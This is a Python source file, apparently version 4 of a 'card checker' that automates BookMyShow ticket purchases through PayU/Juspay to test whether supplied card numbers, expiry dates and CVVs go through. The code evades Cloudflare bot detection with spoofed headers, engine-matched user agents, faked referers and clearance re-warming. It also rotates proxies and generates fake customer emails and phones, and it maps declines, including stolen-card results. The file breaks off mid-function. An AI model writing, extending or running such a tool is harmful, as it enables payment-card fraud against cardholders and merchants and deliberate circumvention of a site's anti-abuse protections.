"""
payu3.py — BookMyShow + PayU (Juspay-orchestrated) card checker.  V4.

Rewritten against the captured HARs:
  in.bookmyshow.com_2026_10_22_10_58_45.har   (full live run, 200s)
  payu/bookmyshow.har, payu/bookmyshow2.har   (second/third capture)

What changed vs V3 and why
--------------------------
1. 403 "movie list" — V3 fetched the /explore/home/<region> DOCUMENT with an
   in-page fetch().  That sends sec-fetch-mode: cors / dest: empty, which is
   not the navigation Cloudflare expects for a HTML route.  V4 navigates
   (page.goto) and reads page.content(), exactly like the browser in the HAR.

2. Header fidelity — the real XHRs carry x-bms-id, x-latitude, x-longitude,
   x-geohash, x-platform-code: WEB (not DESKTOP-WEB) and never x-dc-token.
   V4 sends the HAR set, and drops unknown headers (an extra header is a
   bigger tell than a missing one).

3. Referer chain — the booking/doTrans calls in the HAR are made from
   /movies/<region>/seat-layout/<ET>/<venue>/<session>/<date>.  V4
   history.pushState()'s the SPA to that route before calling, so the
   referer the browser attaches is the same one the real client sends.

4. 403 recovery — every API call goes through _api(), which on 403/429
   re-warms the page (reload -> wait for cf_clearance) and retries once.
   A 403 is now transient, not fatal.

5. UA/engine match — the HAR was Firefox, but Playwright here ships
   Chromium.  A Firefox UA on Chromium's TLS is a Cloudflare signal, so V4
   pins the UA to the actual engine version (CHROME_UA) and sets
   sec-ch-ua from the engine instead of faking a foreign browser.

6. Bandwidth — one full page load is ~450 requests / >1.3MB, which is why
   the free webshare 1GB dies in ~30 checks.  V4 aborts image/media/font
   and all ad/analytics hosts (ads, GTM, clevertap, sentry, branch,
   doubleclick, clickstream).  Same page, a fraction of the bytes.

7. Dead proxies — webshare answers CONNECT with "402 Bandwidth limit
   reached", which Chromium surfaces as ERR_TUNNEL_CONNECTION_FAILED.
   V4 preflights the proxy (HTTP GET through it) and raises ProxyError
   with a reason ("bandwidth" / "auth" / "tunnel") instead of a browser
   that looks like a CF failure.  Optional sticky session via
   BMS_STICKY=1 (username -> user-rotate-session-<id>), auto-falls back
   to the plain rotating username if the endpoint rejects it.

8. Payment — doPGPost is a real form submit in a second tab (the HAR shows
   it as a document navigation that auto-submits to juspay).  The SPA then
   POSTs to api.payu.in/public/ and renders the Pay button itself, so the
   device fingerprint (fems/v1/device-details) is genuine.  After the
   checkoutx/payments response we read the landing page URL for the real
   paymentId and poll services-in check-status for the authoritative
   verdict (that is where "Your payment failed" + errorCode come from).

Flow (unchanged, HAR-verified):
  explore -> movies -> showtimes-by-event -> seatlayout -> doTrans
  (AES seat map) -> booking/movies -> userDetails cookie -> OSP
  -> doPGPost -> juspay -> payu SPA -> Pay -> checkoutx/payments
  -> landing-juspay-card -> check-status poll
"""
from __future__ import annotations

import asyncio
import base64
import json
import os
import random
import re
import time
import urllib.parse
from dataclasses import dataclass

import requests
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives.asymmetric import padding as _rsa_padding
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes

# ── constants (decoded from the BMS + PayU JS bundles / HARs) ────────────
TOKEN = "67x1xa33b4x422b361ba"
APP_CODE = "WEB"
REGION = "patna"
REGION_CODE = "PATN"
REGION_META = {
    "patna": ("PATN", "25.61046", "85.141667", "tus"),
}
BMS_HOME = "https://in.bookmyshow.com"
SERVICES = "https://services-in.bookmyshow.com"
DO_PG_POST = f"{SERVICES}/payserv/doPGPost.aspx"

SEAT_LAYOUT_KEY = b"kYp3s6v9y$B&E)H+MbQeThWmZq4t7w!z"
SEAT_LAYOUT_IV = bytes(16)

GET_PARAMS_URL_ENCRYPTED = "SWGHs8ET5jlEaw4FZhiYzyAEdWb2RYjiCROvmGrP+8a4xl+Vo3zgX7DeLghcf9el"
GET_PARAMS_URL = "https://in.bookmyshow.com/getParams.bms"

PAYU_RSA_PUBLIC_KEY_PEM = """-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAtORWHpUsItXPVSB2ZXxmo/BFChyR+Zrnfl8NOJQe42/Q7hZfsxlwc29bo9R4yUkK9+5XUAXXvpWsurx4n7Ve4JcDvj/ipXcR9+ZRPDaQ9oBmQ8iAF2lcG5pVEIPv7iW0m8pk5Ra/s3elZuUIW0y1TOBwy9PCBGrtvUe9c/TkZPv4E3xFZB8y6AvMtUnwzOAJDIKeEs1AbMSnH8s8vNlTu1mXiNzlHOlWwUVlMk5n+p0O3zAseU0jshmnY2SH0nfzr9hX44sQOG5FG1YQvAQoi9rQ1Ac91IiXH0wxJfWdzL6npHtoODJZwApyLJW8+BCfP+0nDVUiGbIBpfWIdfO36wIDAQAB
-----END PUBLIC KEY-----"""

# engine-matched UA (Playwright's bundled Chromium is 151.x here)
CHROME_UA = os.environ.get(
    "BMS_UA",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) "
    "Chrome/151.0.0.0 Safari/537.36",
)

ADVERTISER_ID = "1641450736640839480"

_BASE_HEADERS = {
    "x-app-code": APP_CODE,
    "x-platform-code": "WEB",
    "x-platform": "WEB",
    "x-location-selection": "manual",
    "x-advertiser-id": ADVERTISER_ID,
    "x-segments": "",
    "accept": "application/json, text/plain, */*",
    "accept-language": "en-IN,en;q=0.9",
}

_BLOCK_HOSTS = (
    "doubleclick.net", "googlesyndication.com", "googleadservices.com",
    "google-analytics.com", "googletagmanager.com", "google.com/pagead",
    "facebook.net", "facebook.com", "clevertap-prod.com", "sentry.io",
    "sentry3.payu.in", "branch.io", "criteo", "taboola", "adnxs.com",
    "adtech-events.bookmyshow.com", "clickstream-in.bookmyshow.com",
)

_DISCOVERY: dict = {}
_DISCOVERY_TTL = float(os.environ.get("BMS_DISCOVERY_TTL", "300"))

_CURRENT_BMS_ID = None


class ProxyError(Exception):
    """Proxy unusable. .reason in {bandwidth, auth, tunnel, timeout}."""

    def __init__(self, reason: str, detail: str = ""):
        self.reason = reason
        self.detail = detail
        super().__init__(f"proxy {reason}: {detail}" if detail else f"proxy {reason}")


class CloudflareBlocked(Exception):
    pass


class FlowError(Exception):
    pass


@dataclass
class BmsResult:
    response_code: str = "ERROR"
    real_response: str = "N/A"
    amount: str = "0.00"
    transaction_id: str = ""
    booking_id: str = ""
    payu_id: str = ""
    payment_id: str = ""


# ── identity ─────────────────────────────────────────────────────────────
def _email(first: str, last: str) -> str:
    return f"{first.lower()}{last.lower()}{random.randint(1000, 9999)}@gmail.com"


def _in_phone() -> str:
    return random.choice("6789") + "".join(random.choices("0123456789", k=9))


def _bms_id() -> str:
    return f"1.{random.randint(100000000, 999999999)}.{int(time.time() * 1000)}"


def _fb_id() -> str:
    return f"fb.{int(time.time())}.{random.randint(10**17, 10**18 - 1)}"


# ── AES seat-map decrypt ─────────────────────────────────────────────────
def decrypt_seat_layout(strData: str) -> str:
    ct = base64.b64decode(strData)
    dec = Cipher(algorithms.AES(SEAT_LAYOUT_KEY), modes.CBC(SEAT_LAYOUT_IV)).decryptor()
    pt = dec.update(ct) + dec.finalize()
    text = pt.decode("utf-8", errors="ignore")
    return text.rstrip("".join(chr(i) for i in range(0, 32)))


# seat label = <areaLetter><statusDigit><seatNumber>[+<cinemaSeatNumber>[+<rank>]]
# status map from the bundle's processSeatLayoutString():
#   0 gangway  1 available  2 booked  3 other-category  4 best-seat
#   7 handicapped  8 companion  9 social-distancing
_SEAT_SELECTABLE = {"1", "4", "7", "8"}


def parse_seat_map(text: str) -> dict:
    """Decrypt-parse the doTrans layout.  Mirrors processSeatLayoutString()."""
    parts = text.split("||")
    if len(parts) < 2:
        return {"areas": [], "rows": []}
    areas, area_by_code = [], {}
    for a in parts[0].split("|"):
        if not a:
            continue
        f = a.split(":")
        if len(f) < 4:
            continue
        rec = {"name": f[0], "letter": f[1], "areaCatCode": f[2], "number": f[3]}
        areas.append(rec)
        area_by_code[f[2]] = rec
    rows = []
    for r in parts[1].split("|"):
        if not r:
            continue
        f = r.split(":")
        if len(f) < 3:
            continue
        row_id, row_number = f[0], f[1]
        if not row_id:                              # "" spacer row
            continue
        seats = []
        for idx, tok in enumerate(f[2:], 1):
            if not tok or len(tok) < 3:
                continue
            bits = tok.split("+")
            label = bits[0]
            cinema_no = bits[1] if len(bits) > 1 else ""
            if cinema_no in ("0", "00"):
                cinema_no = ""
            status = label[1] if len(label) > 1 and label[1].isdigit() else "0"
            seat_no = label[2:]
            if not seat_no.isdigit():
                continue
            areas_letters = [x for x in areas if x["letter"] == label[0]]
            area = areas_letters[0] if areas_letters else {}
            seats.append({
                "areaLetter": label[0],
                "areaCatCode": area.get("areaCatCode", ""),
                "areaNumber": area.get("number", ""),
                "label": label,
                "seatNo": seat_no,
                "seatNoInt": int(seat_no),
                "cinemaSeatNo": cinema_no,
                "status": status,
                "rawIdx": idx,
            })
        rows.append({"rowId": row_id, "rowNumber": row_number, "seats": seats})
    return {"areas": areas, "rows": rows}


def available_seats(seat_map: dict, area_cat_code: str = "") -> list:
    out = []
    for r in seat_map["rows"]:
        for s in r["seats"]:
            if s["status"] not in _SEAT_SELECTABLE:
                continue
            if area_cat_code and s["areaCatCode"] != area_cat_code:
                continue
            out.append({
                "rowId": r["rowId"], "rowNo": r["rowNumber"],
                "seatNo": s["seatNo"], "seatNoInt": s["seatNoInt"],
                "cinemaSeatNo": s["cinemaSeatNo"],
                "areaCatCode": s["areaCatCode"], "areaNumber": s["areaNumber"],
            })
    return out


# ── PayU card encryption (kept for direct-API use) ───────────────────────
def encrypt_payu_card(card_json: str) -> tuple[str, str]:
    aes_key = os.urandom(32)
    iv = os.urandom(12)
    enc = Cipher(algorithms.AES(aes_key), modes.GCM(iv)).encryptor()
    ct = enc.update(card_json.encode("utf-8")) + enc.finalize()
    body = base64.b64encode(iv + ct + enc.tag).decode()
    pub = serialization.load_pem_public_key(PAYU_RSA_PUBLIC_KEY_PEM.encode())
    return base64.b64encode(pub.encrypt(aes_key, _rsa_padding.PKCS1v15())).decode(), body


# ── proxy: parse / preflight / sticky ────────────────────────────────────
def _parse_proxy(proxy_url: str) -> dict:
    if not proxy_url:
        return {}
    u = urllib.parse.urlparse(proxy_url if "://" in proxy_url else "http://" + proxy_url)
    d = {"server": f"{u.scheme}://{u.hostname}:{u.port or 80}"}
    if u.username:
        d["username"] = urllib.parse.unquote(u.username)
        d["password"] = urllib.parse.unquote(u.password or "")
    return d


def _norm_proxy(proxy_url: str) -> str:
    p = (proxy_url or "").strip()
    if not p:
        return ""
    return p if "://" in p else "http://" + p


def _sticky_variant(proxy_url: str) -> str:
    """webshare rotating endpoint -> sticky session username.

    user-rotate -> user-rotate-session-<8 chars>.  If the endpoint rejects
    that form the preflight falls back to the plain rotating username.
    """
    if os.environ.get("BMS_STICKY", "1") not in ("1", "true", "yes"):
        return proxy_url
    try:
        u = urllib.parse.urlparse(_norm_proxy(proxy_url))
        if not u.username or "-session-" in u.username:
            return proxy_url
        sid = "".join(random.choices("abcdefghijklmnopqrstuvwxyz0123456789", k=8))
        user = f"{urllib.parse.unquote(u.username)}-session-{sid}"
        netloc = f"{user}:{u.password}@{u.hostname}:{u.port or 80}"
        return urllib.parse.urlunparse((u.scheme or "http", netloc, "", "", "", ""))
    except Exception:
        return proxy_url


def preflight(proxy_url: str, timeout: float = 15.0) -> str:
    """One cheap request through the proxy.  Returns "" when usable."""
    if not proxy_url:
        return "direct"
    p = _norm_proxy(proxy_url)
    try:
        r = requests.get("http://api.ipify.org", timeout=timeout,
                         proxies={"http": p, "https": p})
        body = (r.text or "").lower()
        if r.status_code in (402, 429) or "bandwidth" in body:
            return "bandwidth"
        if r.status_code == 407:
            return "auth"
        if r.status_code != 200:
            return f"http{r.status_code}"
        return ""
    except requests.exceptions.ProxyError as e:
        low = str(e).lower()
        if "407" in low or "auth" in low or "credentials" in low:
            return "auth"
        return "tunnel"
    except requests.exceptions.Timeout:
        return "timeout"
    except Exception:
        return "tunnel"


def pick_proxy(proxy_url: str) -> str:
    """Sticky first, plain rotating as fallback, ProxyError if both dead."""
    if not proxy_url:
        return ""
    sticky = _sticky_variant(proxy_url)
    for cand in (sticky, _norm_proxy(proxy_url)):
        if cand == _norm_proxy(proxy_url) and cand == sticky:
            continue
        reason = preflight(cand)
        if reason in ("", "direct"):
            return cand
        if reason == "bandwidth":
            raise ProxyError("bandwidth", "webshare 402 Bandwidth limit reached")
    raise ProxyError("tunnel", "proxy unreachable")


# ── browser ──────────────────────────────────────────────────────────────
async def _block(route):
    try:
        req = route.request
        if req.resource_type in ("image", "media", "font"):
            return await route.abort()
        host = urllib.parse.urlparse(req.url).hostname or ""
        if any(h in host for h in _BLOCK_HOSTS):
            return await route.abort()
    except Exception:
        pass
    return await route.continue_()


async def _launch(proxy_url: str):
    from playwright.async_api import async_playwright
    pw = await async_playwright().start()
    launch_kw = {"headless": False}
    px = _parse_proxy(proxy_url)
    if px:
        launch_kw["proxy"] = px
    browser = await pw.chromium.launch(
        **launch_kw,
        args=[
            "--no-sandbox",
            "--disable-blink-features=AutomationControlled",
            "--disable-gpu",
            "--disable-dev-shm-usage",
            "--no-zygote",
            "--disable-background-networking",
            "--disable-component-update",
            "--disable-default-apps",
            "--disable-sync",
            "--metrics-recording-only",
            "--no-first-run",
            "--mute-audio",
            "--disable-features=Translate,MediaRouter,OptimizationHints",
        ],
    )
    ctx = await browser.new_context(
        user_agent=CHROME_UA,
        viewport={"width": 1366, "height": 768},
        screen={"width": 1366, "height": 768},
        locale="en-IN",
        timezone_id="Asia/Kolkata",
        device_scale_factor=1,
        is_mobile=False,
        has_touch=False,
        color_scheme="light",
        extra_http_headers={"accept-language": "en-IN,en;q=0.9"},
    )
    if os.environ.get("BMS_BLOCK_ASSETS", "1") in ("1", "true", "yes"):
        await ctx.route("**/*", _block)
    ctx.set_default_timeout(60000)
    page = await ctx.new_page()
    return pw, browser, ctx, page


def _is_challenge(html: str) -> bool:
    low = html[:4000].lower()
    return ("just a moment" in low or "cf-challenge" in low
            or "attention required" in low or "verify you are human" in low
            or "enable javascript and cookies to continue" in low)


async def _cf_ready(page, url: str, timeout: float = 90.0) -> None:
    """Navigate and wait until a real page (not a CF interstitial) is served."""
    deadline = time.time() + timeout
    resp = await page.goto(url, wait_until="domcontentloaded", timeout=60000)
    while time.time() < deadline:
        html = await page.content()
        cookies = await page.context.cookies(BMS_HOME)
        cleared = any(c["name"] == "cf_clearance" for c in cookies)
        if not _is_challenge(html) and (cleared or (resp and resp.status == 200)):
            return
        if resp and resp.status in (403, 429, 503) and not cleared:
            await page.wait_for_timeout(1500)
            try:
                await page.reload(wait_until="domcontentloaded", timeout=60000)
            except Exception:
                await page.goto(url, wait_until="domcontentloaded", timeout=60000)
            continue
        await page.wait_for_timeout(1500)
    raise CloudflareBlocked(f"clearance not obtained for {url}")


async def _bms_headers(page) -> dict:
    h = dict(_BASE_HEADERS)
    h["x-region-code"] = REGION_CODE
    h["x-region-slug"] = REGION
    try:
        meta = REGION_META.get(REGION)
        if meta:
            h["x-latitude"], h["x-longitude"], h["x-geohash"] = meta[1], meta[2], meta[3]
    except Exception:
        pass
    if _CURRENT_BMS_ID:
        h["x-bms-id"] = _CURRENT_BMS_ID
    return h


_JS_FETCH = """
async ({url, method, body, headers}) => {
    const opts = {method, headers, credentials: 'same-origin'};
    if (body !== undefined && body !== null) opts.body = body;
    try {
        const r = await fetch(url, opts);
        const text = await r.text();
        return {status: r.status, url: r.url, body: text, ok: r.ok};
    } catch (e) {
        return {status: 0, url, body: String(e), ok: false};
    }
}
"""


async def _push_route(page, path: str) -> None:
    try:
        await page.evaluate("p => { try { history.pushState({}, '', p); } catch (e) {} }", path)
    except Exception:
        pass


async def _rewarm(page) -> None:
    """Re-establish the document + clearance after a 403."""
    try:
        await page.goto(f"{BMS_HOME}/explore/home/{REGION}",
                        wait_until="domcontentloaded", timeout=60000)
        await page.wait_for_timeout(1200)
        if _is_challenge(await page.content()):
            await _cf_ready(page, f"{BMS_HOME}/explore/home/{REGION}")
        await page.context.add_cookies(
            [{"name": "bmsId", "value": '"' + (_CURRENT_BMS_ID or _bms_id()) + '"', "url": BMS_HOME}])
    except Exception:
        pass


async def _api(page, url: str, method: str = "GET", body=None, headers=None,
               tries: int = 2) -> dict:
    hdrs = await _bms_headers(page)
    if headers:
        hdrs.update(headers)
    if body is not None and not isinstance(body, str):
        body = json.dumps(body)
        hdrs.setdefault("content-type", "application/json")
    elif body is not None:
        hdrs.setdefault("content-type", "application/json")
    last = None
    for attempt in range(tries):
        last = await page.evaluate(_JS_FETCH, {"url": url, "method": method,
                                               "body": body, "headers": hdrs})
        if last["status"] in (403, 429) and attempt + 1 < tries:
            await _rewarm(page)
            continue
        break
    if last["status"] == 403:
        raise CloudflareBlocked(f"{url} -> 403")
    return last


# ── discovery (cached per region) ────────────────────────────────────────
def _cache_get(key):
    e = _DISCOVERY.get(key)
    if e and time.time() - e["ts"] < _DISCOVERY_TTL:
        return e["v"]
    return None


def _cache_put(key, v):
    _DISCOVERY[key] = {"ts": time.time(), "v": v}


async def fetch_movies(page, use_cache: bool = True) -> list:
    key = ("movies", REGION)
    if use_cache:
        hit = _cache_get(key)
        if hit:
            return hit
    html = await page.content()
    events, seen = [], set()
    for m in re.finditer(r"ET[0-9]{6,}", html):
        ec = m.group(0)
        if ec not in seen:
            seen.add(ec)
            events.append({"eventCode": ec, "title": ec})
    if events:
        _cache_put(key, events)
    return events


async def fetch_showtimes(page, event_code: str, date_code: str) -> list:
    key = ("showtimes", REGION, event_code, date_code)
    hit = _cache_get(key)
    if hit:
        return hit
    q = urllib.parse.urlencode({
        "etCodes": event_code, "dateCode": date_code, "isDesktop": "true",
        "regionCode": REGION_CODE, "xLocationShared": "false", "memberId": "",
        "subCode": "", "appCode": APP_CODE, "language": "hindi",
        "refEventCode": event_code,
    })
    r = await _api(page, f"{BMS_HOME}/api/movies-data/v5/showtimes-by-event/primary-dynamic?{q}")
    if r["status"] != 200:
        return []
    data = json.loads(r["body"])
    sessions, seen = [], set()
    cur_venue = [""]

    def scan(o):
        if isinstance(o, dict):
            if o.get("venueCode"):
                cur_venue[0] = o["venueCode"]
            sid = o.get("sessionId")
            if sid is not None and str(sid) not in seen:
                seen.add(str(sid))
                sessions.append({"venueCode": cur_venue[0], "sessionId": str(sid)})
            for v in o.values():
                scan(v)
        elif isinstance(o, list):
            for v in o:
                scan(v)

    scan(data)
    sessions = [s for s in sessions if s["venueCode"]]
    if sessions:
        _cache_put(key, sessions)
    return sessions


async def fetch_seat_layout(page, event_code: str, date_code: str, venue_code: str) -> list:
    key = ("layout", REGION, event_code, date_code, venue_code)
    hit = _cache_get(key)
    if hit:
        return hit
    q = urllib.parse.urlencode({"eventCode": event_code, "dateCode": date_code,
                                "regionCode": REGION_CODE, "venueCode": venue_code})
    r = await _api(page, f"{BMS_HOME}/api/movies-data/seatlayout/v1/primary?{q}", headers={
        "referer": f"{BMS_HOME}/movies/{REGION}/seat-layout/{event_code}/{venue_code}",
    })
    if r["status"] != 200:
        return []
    data = json.loads(r["body"])
    shows = []
    for st in (data.get("data", {}).get("showTimes") or []):
        cats = [{"priceCode": c.get("priceCode"), "areaCatCode": c.get("areaCatCode"),
                 "curPrice": float(c.get("curPrice") or 0),
                 "availStatus": str(c.get("availStatus") or "")}
                for c in (st.get("categories") or [])]
        cats = [c for c in cats if c["curPrice"] > 0]
        if cats:
            shows.append({"sessionId": str(st.get("sessionId")), "categories": cats})
    if shows:
        _cache_put(key, shows)
    return shows


def _pick_cheapest(shows, session_id: str = ""):
    best = None
    for sh in shows:
        if session_id and sh["sessionId"] != session_id:
            continue
        for c in sh["categories"]:
            if not c["curPrice"]:
                continue
            cand = {"sessionId": sh["sessionId"], "priceCode": c["priceCode"],
                    "areaCatCode": c["areaCatCode"], "curPrice": c["curPrice"]}
            if best is None or c["curPrice"] < best["curPrice"]:
                best = cand
    return best


def _cheapest_bookable(shows: list, seat_map: dict):
    """Cheapest category that actually has seats in the decrypted map.

    The layout advertises every price band, including bands whose area letter
    has no seats for this session (blocked/sold out), so availability has to
    come from the seat map, not from the layout.
    """
    best = None
    for sh in shows:
        for c in sh["categories"]:
            seats = available_seats(seat_map, c["areaCatCode"])
            if not seats:
                continue
            cand = {"sessionId": sh["sessionId"], "priceCode": c["priceCode"],
                    "areaCatCode": c["areaCatCode"], "curPrice": c["curPrice"]}
            if best is None or c["curPrice"] < best["curPrice"]:
                best = cand
    return best


def _sessions_by_price(shows: list) -> list:
    def cheapest(sh):
        prices = [c["curPrice"] for c in sh["categories"] if c["curPrice"]]
        return min(prices) if prices else float("inf")
    return sorted(shows, key=cheapest)


def uuid4_hex() -> str:
    import uuid
    return uuid.uuid4().hex


async def fetch_seat_map(page, venue_code: str, session_id: str, fb_id: str) -> dict:
    fields = [
        ("strAppCode", APP_CODE), ("lngTransactionIdentifier", "0"),
        ("strCommand", "GETSEATLAYOUT"), ("strVenueCode", venue_code),
        ("strParam1", session_id), ("strParam2", APP_CODE),
        ("strParam3", ""), ("strParam4", ""), ("strParam5", "Y"),
        ("strParam6", "N"), ("strParam7", "N"), ("strParam8", ""),
        ("strParam9", ""), ("strParam10", ""), ("strFormat", "json"),
        ("facebookBrowserId", fb_id),
    ]
    boundary = "----geckoformboundary" + uuid4_hex()
    body = ""
    for name, val in fields:
        body += (f"--{boundary}\r\nContent-Disposition: form-data; name=\"{name}\""
                 f"\r\n\r\n{val}\r\n")
    body += f"--{boundary}--\r\n"
    r = await _api(page, f"{SERVICES}/doTrans.aspx", "POST", body, headers={
        "content-type": f"multipart/form-data; boundary={boundary}",
        "referer": f"{BMS_HOME}/movies/{REGION}/seat-layout/{venue_code}/{session_id}",
        "origin": BMS_HOME,
    })
    if r["status"] != 200:
        raise FlowError(f"doTrans HTTP {r['status']}")
    data = json.loads(r["body"])
    bms = data.get("BookMyShow", {})
    if str(bms.get("blnSuccess")).lower() != "true":
        raise FlowError(f"seat map: {bms.get('strException') or 'failed'}")
    return parse_seat_map(decrypt_seat_layout(bms["strData"]))


# ── booking ──────────────────────────────────────────────────────────────
def _seat_payload(seat: dict, qty: int = 1) -> str:
    """selectedSeats, exactly as the bundle builds it:

        const a = seats.map(e => `${e.areaCode}|${e.areaNumber}|${e.rowId}|${e.seatNumber}`).join("|")
        selectedSeats = `|${qty}|${a}|`

    Captured live value: |1|AC00000001|1|5|12|
    """
    return (f"|{qty}|{seat['areaCatCode']}|{seat['areaNumber']}|"
            f"{seat['rowId']}|{seat['seatNo']}|")


async def book(page, event_code, venue_code, session_id, price_code, area_code,
               seat_map, limit_seats: int = 6) -> dict:
    bms_id = _CURRENT_BMS_ID or _bms_id()
    body = {
        "appCode": APP_CODE, "venueCode": venue_code, "eventCode": event_code,
        "sessionId": session_id, "numberOfTickets": 1, "ticketCategory": price_code,
        "bmsId": bms_id, "token": TOKEN, "seatLayoutType": "Y",
        "offerData": {"offerSelected": False}, "companyCode": venue_code,
        "facebookBrowserId": _fb_id(),
    }
    await _push_route(page, f"/movies/{REGION}/seat-layout/{event_code}/{venue_code}/{session_id}/{DATE}")
    seats = available_seats(seat_map, area_code)
    if not seats:
        raise FlowError("no available seats in the decrypted map")
    seats.sort(key=lambda s: (int(s["rowId"]) if str(s["rowId"]).isdigit() else 0, s["seatNoInt"]))
    # start mid-map: edge seats are the ones most likely already held
    lead = len(seats) // 3
    seats = seats[lead:] + seats[:lead]
    last_err = ""
    for s in seats[:limit_seats]:
        body["selectedSeats"] = _seat_payload(s)
        r = await _api(page, f"{BMS_HOME}/api/v2/mobile/booking/movies", "POST", body,
                       headers={"origin": BMS_HOME})
        if r["status"] == 200:
            try:
                data = json.loads(r["body"])
            except Exception:
                data = {}
            if data.get("transactionId"):
                return {"transactionId": str(data["transactionId"]),
                        "transactionUID": data.get("transactionUID", ""),
                        "bookingId": data.get("bookingId", "")}
            last_err = str(data)[:200]
        else:
            last_err = f"HTTP {r['status']}: {r['body'][:120]}"
        await asyncio.sleep(0.2)
    raise FlowError(f"booking rejected ({last_err or 'no seat accepted'})")


async def set_user_details(page, email: str, phone: str) -> None:
    ud = json.dumps({"deemedUserEmail": email, "deemedUserMobile": phone,
                     "countryCode": "+1", "isdCountryCode": "US"}, separators=(",", ":"))
    await page.context.add_cookies([{"name": "userDetails", "value": ud, "url": BMS_HOME}])


async def osp(page, trans: dict) -> None:
    body = {
        "transactionId": trans["transactionId"], "transactionUID": trans["transactionUID"],
        "bookingId": trans["bookingId"], "numberOfTickets": 1,
        "venueCode": trans.get("venueCode", ""), "eventCode": trans.get("eventCode", ""),
        "userPreference": {"ticketType": "mTicket"}, "flow": "movies", "eventType": "MT",
        "companyCode": trans.get("venueCode", ""),
        "amountPayable": trans.get("amountPayable", 0), "numericBookingId": 0,
        "appCode": APP_CODE, "customerStatus": "gc",
    }
    ref = f"{BMS_HOME}/order-summary/{body['eventCode']}/{body['venueCode']}"
    for path in ("/api/osp/v1/summary/osp/primary", "/api/osp/v1/summary/osp/secondary"):
        try:
            await _api(page, BMS_HOME + path, "POST", body, headers={"origin": BMS_HOME,
                                                                    "referer": ref})
        except Exception:
            pass
    for path in ("/api/osp/v1/summary/layout/osp", "/api/payment-listing/layout"):
        try:
            await _api(page, BMS_HOME + path, headers={"referer": ref})
        except Exception:
            pass


# ── payment ──────────────────────────────────────────────────────────────
_PG_FORM_JS = """
({action, fields}) => {
    const f = document.createElement('form');
    f.method = 'POST';
    f.action = action;
    f.style.display = 'none';
    for (const [k, v] of Object.entries(fields)) {
        const i = document.createElement('input');
        i.type = 'hidden'; i.name = k; i.value = v;
        f.appendChild(i);
    }
    document.body.appendChild(f);
    f.submit();
    return true;
}
"""


def _pg_fields(trans: dict, card, email: str, phone: str) -> dict:
    number, month, year, cvv, name = card
    exp = f"{year}{month}"
    payment_string = (f"|TYPE=DEBIT|CARDTYPE={_card_type(number)}|CARDNO={number}|"
                      f"EXPIRY={exp}|CVV={cvv}|NAME={name}|MEMBERID=|LSID=|")
    return {
        "strAppCode": APP_CODE,
        "lngTransId": str(trans["transactionId"]),
        "transactionUID": str(trans["transactionUID"]),
        "strBookingAlert": f"|EMAIL={email}|MOBILE={phone}|",
        "strPaymentString": payment_string,
        "strTransData": "", "TD": "", "strEventType": "MT",
        "strReturnUrl": GET_PARAMS_URL_ENCRYPTED,
        "deemedIsdCode": "+1", "isdCode": "+91", "presaleUUID": "",
    }


async def pay(page, pay_page, trans: dict, card, email: str, phone: str) -> dict:
    """Submit doPGPost in a fresh tab, let juspay/payu drive, click Pay."""
    seen = {"landing": ""}

    def _nav(frame):
        u = frame.url or ""
        if "landing-juspay-card" in u or "payment-status" in u:
            seen["landing"] = u

    try:
        pay_page.on("framenavigated", _nav)
    except Exception:
        pass

    async def _grab_pid(resp):
        try:
            if "payment-status/check-status" in resp.url:
                pd = resp.request.post_data or ""
                m = re.search(r"paymentId=(\d+)", pd)
                if m:
                    seen["pid"] = m.group(1)
        except Exception:
            pass

    try:
        pay_page.on("response", lambda r: asyncio.create_task(_grab_pid(r)))
    except Exception:
        pass
    await pay_page.goto("about:blank")
    await pay_page.evaluate(_PG_FORM_JS, {"action": DO_PG_POST,
                                          "fields": _pg_fields(trans, card, email, phone)})
    try:
        await pay_page.wait_for_selector("button:has-text('Pay')", timeout=120000)
    except Exception as e:
        raise FlowError(f"payu SPA not reached: {str(e)[:80]}")
    try:
        async with pay_page.expect_response("**/checkoutx/payments", timeout=120000) as ri:
            await pay_page.click("button:has-text('Pay')", timeout=20000)
        resp = await ri.value
        raw = await resp.text()
        try:
            data = json.loads(raw)
        except Exception:
            data = {"status": resp.status, "raw": raw[:300]}
        data["_http"] = resp.status
    except Exception as e:
        data = {"_error": str(e)[:160]}
    # landing page carries the real paymentId
    payment_id = seen.get("pid") or ""
    deadline = time.time() + 60
    while not payment_id and time.time() < deadline:
        for u in (seen["landing"], pay_page.url or "", page.url or ""):
            m = re.search(r"landing-juspay-card/[^/]+/(\d+)/(\d+)/", u or "")
            if m:
                payment_id = m.group(2)
                break
        if payment_id:
            break
        await asyncio.sleep(1.5)
    data["_payment_id"] = payment_id
    return data


async def poll_status(page, trans_id: str, payment_id: str, tries: int = 8) -> dict:
    if not payment_id:
        return {}
    body = {
        "appCode": APP_CODE, "transactionId": str(trans_id), "paymentId": str(payment_id),
        "payType": "JUSPAY_CARD",
        "paymentString": (f"|TYPE=JUSPAY_CARD|PROCESSTYPE=CHECK_ORDER_STATUS|"
                          f"PaymentId={payment_id}|TransId={trans_id}|AppCode={APP_CODE}|BankCode=|"),
    }
    for _ in range(tries):
        try:
            r = await _api(page, f"{SERVICES}/payments/v1/orders/check-status", "POST", body,
                           headers={"origin": BMS_HOME, "referer": BMS_HOME + "/"})
            if r["status"] == 200:
                d = json.loads(r["body"])
                view = d.get("view") or {}
                if view.get("keepPolling") is False or view.get("state") in ("Success", "Failed"):
                    return d
        except Exception:
            pass
        await asyncio.sleep(3.0)
    return {}


def _card_type(number: str) -> str:
    n = number[:6]
    if n[:1] == "4":
        return "VISA"
    if n[:2] in ("51", "52", "53", "54", "55"):
        return "MASTERCARD"
    if n[:2] in ("36", "38", "60"):
        return "RUPAY" if n[:2] == "60" else "DINERS"
    if n[:4] == "6011" or n[:2] == "65":
        return "DISCOVER"
    if n[:2] in ("34", "37"):
        return "AMEX"
    return "VISA"


_PAYU_ERROR_MAP = {
    "insufficient": "INSUFFICIENT_FUNDS",
    "do not honor": "DECLINED",
    "cvv": "INCORRECT_CVV",
    "invalid cvv": "INCORRECT_CVV",
    "expired": "EXPIRED_CARD",
    "stolen": "STOLEN_CARD",
    "3ds": "3DS_REQUIRED",
    "authentication": "3DS_REQUIRED",
    "invalid card": "INVALID_CARD",
    "card not supported": "NOT_ACCEPTED",
}


def _map_payu(pay_data: dict, poll_data: dict) -> tuple:
